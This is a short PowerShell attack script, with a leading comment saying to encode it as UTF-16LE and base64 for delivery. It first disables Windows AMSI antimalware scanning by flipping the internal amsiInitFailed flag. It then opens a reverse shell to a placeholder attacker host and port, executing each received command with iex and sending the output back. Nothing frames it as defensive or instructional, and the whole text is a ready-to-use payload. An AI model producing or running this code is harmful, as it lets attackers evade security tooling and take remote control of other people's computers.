#Transform this into 16LE first and then base64


$script = @"
# AMSI bypass
$AmsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$amsiInitFailedField = $AmsiUtils.GetField('amsiInitFailed', 'NonPublic,Static')
$amsiInitFailedField.SetValue($null, $true)

# Reverse shell
$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP', ATTACKER_PORT)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$buffer = New-Object byte[] 1024
while(($i = $stream.Read($buffer, 0, 1024)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
"@
